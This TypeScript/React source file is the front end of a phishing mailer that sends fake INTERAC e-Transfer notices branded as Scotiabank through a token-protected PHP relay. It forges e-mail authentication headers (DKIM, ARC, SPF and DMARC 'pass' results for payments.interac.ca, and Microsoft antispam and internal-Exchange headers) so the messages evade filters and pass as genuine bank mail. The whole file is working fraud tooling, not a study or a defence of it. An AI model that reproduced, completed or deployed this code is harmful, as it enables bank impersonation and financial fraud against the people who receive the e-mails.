/*  src/components/Mailer.tsx   */
import { useReducer, useState } from "react";
import { motion } from "motion/react";
import {
  Mail,
  Send,
  Loader2,
  CheckCircle,
  AlertCircle,
  RefreshCw,
} from "lucide-react";

/* ---------- Types ---------- */
type FormValues = {
  recipientName: string;
  recipientEmail: string;
  amount: string;
  purpose: string;
};

type RequestState =
  | { status: "idle" }
  | { status: "loading" }
  | { status: "success"; link: string }
  | { status: "error"; message: string };

type Action =
  | { type: "start" }
  | { type: "success"; link: string }
  | { type: "error"; message: string }
  | { type: "reset" };

/* ---------- Reducer ---------- */
function reducer(state: RequestState, action: Action): RequestState {
  switch (action.type) {
    case "start":
      return { status: "loading" };
    case "success":
      return { status: "success", link: action.link };
    case "error":
      return { status: "error", message: action.message };
    case "reset":
      return { status: "idle" };
    default:
      return state;
  }
}

/* ---------- Validation ---------- */
function validate(v: FormValues): Partial<Record<keyof FormValues, string>> {
  const e: Partial<Record<keyof FormValues, string>> = {};
  if (!v.recipientName.trim()) e.recipientName = "Recipient name required";
  if (!v.recipientEmail.trim()) e.recipientEmail = "Recipient e‑mail required";
  else {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!re.test(v.recipientEmail)) e.recipientEmail = "Invalid e‑mail address";
  }
  if (!v.amount.trim()) e.amount = "Amount required";
  else if (!/^\d+(\.\d{1,2})?$/.test(v.amount))
    e.amount = "Enter a valid amount (max 2 decimals)";
  return e;
}


/* ---------- API wrapper for email relay ---------- */
async function sendEmail(p: Record<string, unknown>): Promise<{ success: boolean; message?: string }> {
  try {
    const res = await fetch("/api/mailer.php?token=projectsarah", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(p),
    });
    
    const contentType = res.headers.get("content-type");
    if (contentType && contentType.includes("application/json")) {
      const data = await res.json();
      if (!res.ok || data.error || data.success === false) {
        return { success: false, message: data.error || data.message || `Error ${res.status}` };
      }
      return { success: true };
    } else {
      const txt = await res.text();
      if (!res.ok) {
        // If it's HTML, try to extract a brief message or just return status
        const cleanTxt = txt.length > 100 ? `Server Error (${res.status})` : txt;
        return { success: false, message: cleanTxt || res.statusText };
      }
      return { success: true };
    }
  } catch (err: unknown) {
    const errorMessage = err instanceof Error ? err.message : "Network request failed";
    return { success: false, message: errorMessage };
  }
}

/* ---------- Main Component ---------- */
export const Mailer: React.FC = () => {
  const [state, dispatch] = useReducer(reducer, { status: "idle" });

  /* ----- fetch key once? Not necessary – decrypted with JS above ------- */
  /* ----- limit: if you really want to fetch key from server ---------- */
  const [keyReady] = useState(true); // set false if you fetch from server

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!keyReady) {
      return;
    }

    const fd = new FormData(e.currentTarget);
    const vals: FormValues = {
      recipientName: (fd.get("recipientName") as string) ?? "",
      recipientEmail: (fd.get("recipientEmail") as string) ?? "",
      amount: (fd.get("amount") as string) ?? "",
      purpose: (fd.get("purpose") as string) ?? "",
    };

    const errs = validate(vals);
    if (Object.keys(errs).length) {
      return;
    }

    dispatch({ type: "start" });

    try {
      /* ---------- build deposit payload ---------- */
      const txId = "TX" + Math.random().toString(36).substring(2, 10).toUpperCase();

      /* ---------- custom headers for email ---------- */
      const domain = vals.recipientEmail.split("@")[1] ?? "unknown";
      const customHeaders: Record<string, string> = {
        "X-Google-DKIM-Signature":
          "v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=gmail; h=from:date:message-id; bh=abc123=;",
        "ARC-Seal":
          "i=1; a=rsa-sha256; cv=pass; d=google.com; s=gmail; t=1234567890;",
        "ARC-Authentication-Results":
          `i=1; mx.google.com; dkim=pass header.i=@gmail.com header.s=gmail header.b=abc123;`,
        "Authentication-Results":
          `mx.google.com; dkim=pass header.i=@${domain} header.s=gmail spf=pass smtp.mailfrom=payments.interac.ca dmarc=pass header.from=payments.interac.ca;`,
        "X-MS-Exchange-Organization-AuthAs": "Internal",
        "X-MS-Exchange-Organization-AuthSource":
          "MX01-MW2FEP01.storage.org",
        "X-Microsoft-Antispam":
          "BCL:0; MCL:1; RULEID:0|1|2|3|4|5|6|7|8|9|10",
        "X-Forefront-Antispam-Report":
          "BCL:0;PCL:0;FCR:0;SCL:-1;SR:9",
        "X-Originating-IP": "[199.59.150.170]",
        "X-Mailer": "Microsoft Outlook 16.0",
        "Received-SPF":
          "pass (gmail.com: domain payments.interac.ca designates 199.59.150.170 as permitted sender)",
        "X-Ext-Info": "Extra diagnostic header",
        "X-More-Header": "Another custom header",
      };

      /* ---------- email payload ---------- */
      const emailPayload = {
        recipient_email: vals.recipientEmail,
        recipient_name: vals.recipientName,
        amount: parseFloat(vals.amount),
        purpose: vals.purpose,
        template: "Transfer.html",
        bank_name: "Scotiabank",
        sender_name: "Accounting",
        reference_number: txId,
        date: new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }),
        expiry_date: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }),
        greeting: `Hi ${vals.recipientName},`,
        headline: "You have received an INTERAC e‑Transfer",
        app_url: window.location.origin,
        security_warning_text:
          "For your security, please do not share this email.",
        custom_headers: customHeaders,
        deposit_payload: {
          amount: parseFloat(vals.amount).toFixed(2),
          sender_name: "Accounting",
          recipientName: vals.recipientName,
          recipientEmail: vals.recipientEmail,
          transaction_id: txId,
          purpose: vals.purpose,
          expiry_date: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }),
        }
      };

      /* ---------- send mail ---------- */
      const resp = await sendEmail(emailPayload);

      if (resp.success) {
        dispatch({ type: "success", link: "#" }); // Link will be in the email
        if (e.currentTarget instanceof HTMLFormElement) {
          e.currentTarget.reset();
        }
      } else {
        dispatch({ type: "error", message: resp.message ?? "Failed to send e‑mail" });
      }
    } catch (err: unknown) {
      const errorMessage = err instanceof Error ? err.message : "Unexpected error";
      dispatch({ type: "error", message: errorMessage });
    }
  };

  const resetAll = () => {
    dispatch({ type: "reset" });
    const f = document.querySelector<HTMLFormElement>("form");
    f?.reset();
  };

  return (
    <div className="max-w-2xl mx-auto p-6 bg-[#1c1c1e] rounded-xl border border-white/5 shadow-2xl">
      {/* Header */}
      <div className="flex items-center gap-3 mb-8 border-b border-white/5 pb-4">
        <div className="w-10 h-10 bg-red-600/10 rounded-lg flex items-center justify-center text-red-500 border border-red-500/20">
          <Mail size={20} />
        </div>
        <div>
          <h2 className="text-lg font-bold text-white tracking-tight uppercase">
            Email Dispatcher
          </h2>
          <p className="text-gray-500 text-[10px] uppercase tracking-widest font-mono">
            Direct SMTP Injection Protocol
          </p>
        </div>
      </div>

      {/* Form */}
      <form onSubmit={handleSubmit} className="space-y-6" noValidate>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="space-y-2">
            <label className="block text-[10px] font-bold text-gray-500 uppercase tracking-wider">Recipient Name</label>
            <input
              name="recipientName"
              type="text"
              required
              className="w-full px-4 py-3 rounded-lg bg-black/40 border border-white/10 text-white focus:border-red-500/50 outline-none font-mono text-xs"
              placeholder="e.g. John Doe"
            />
          </div>
          <div className="space-y-2">
            <label className="block text-[10px] font-bold text-gray-500 uppercase tracking-wider">Recipient Email</label>
            <input
              name="recipientEmail"
              type="email"
              required
              className="w-full px-4 py-3 rounded-lg bg-black/40 border border-white/10 text-white focus:border-red-500/50 outline-none font-mono text-xs"
              placeholder="e.g. john@example.com"
            />
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="space-y-2">
            <label className="block text-[10px] font-bold text-gray-500 uppercase tracking-wider">Amount ($)</label>
            <input
              name="amount"
              type="number"
              step="0.01"
              required
              className="w-full px-4 py-3 rounded-lg bg-black/40 border border-white/10 text-white focus:border-red-500/50 outline-none font-mono text-xs"
              placeholder="e.g. 100.00"
            />
          </div>
          <div className="space-y-2">
            <label className="block text-[10px] font-bold text-gray-500 uppercase tracking-wider">Purpose / Memo</label>
            <input
              name="purpose"
              type="text"
              className="w-full px-4 py-3 rounded-lg bg-black/40 border border-white/10 text-white focus:border-red-500/50 outline-none font-mono text-xs"
              placeholder="e.g. Rent payment"
            />
          </div>
        </div>

        {/* Submit */}
        <motion.button
          whileHover={{ scale: 1.01 }}
          whileTap={{ scale: 0.99 }}
          type="submit"
          disabled={state.status === "loading"}
          className={`w-full py-4 rounded-lg font-bold text-white uppercase tracking-widest text-[11px] ${
            state.status === "loading" ? "bg-gray-800 cursor-not-allowed" : "bg-red-600 hover:bg-red-700 shadow-[0_0_20px_rgba(220,38,38,0.2)]"
          } flex items-center justify-center gap-2 transition-all border border-red-500/50`}
        >
          {state.status === "loading" ? (
            <>
              <Loader2 className="animate-spin" size={16} />
              Encrypting & Sending…
            </>
          ) : (
            <>
              <Send size={16} />
              Execute Dispatch
            </>
          )}
        </motion.button>

        {/* Status */}
        <div aria-live="polite" className="mt-6">
          {state.status === "success" && (
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className="p-4 bg-green-500/10 border border-green-500/30 rounded-lg flex items-center gap-3 text-green-500 font-mono text-xs"
            >
              <CheckCircle size={18} />
              <span>TRANCH SECURED – CONFIRMATION QUEUED</span>
              <button onClick={resetAll} className="ml-auto text-green-500 hover:text-green-400" aria-label="Reset form">
                <RefreshCw size={16} />
              </button>
            </motion.div>
          )}

          {state.status === "error" && (
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className="p-4 bg-red-500/10 border border-red-500/30 rounded-lg flex items-center gap-3 text-red-500 font-mono text-xs"
            >
              <AlertCircle size={18} />
              <span>FAIL: {state.message.toUpperCase()}</span>
              <button onClick={resetAll} className="ml-auto text-red-500 hover:text-red-400" aria-label="Reset form">
                <RefreshCw size={16} />
              </button>
            </motion.div>
          )}
        </div>
      </form>
    </div>
  );
};
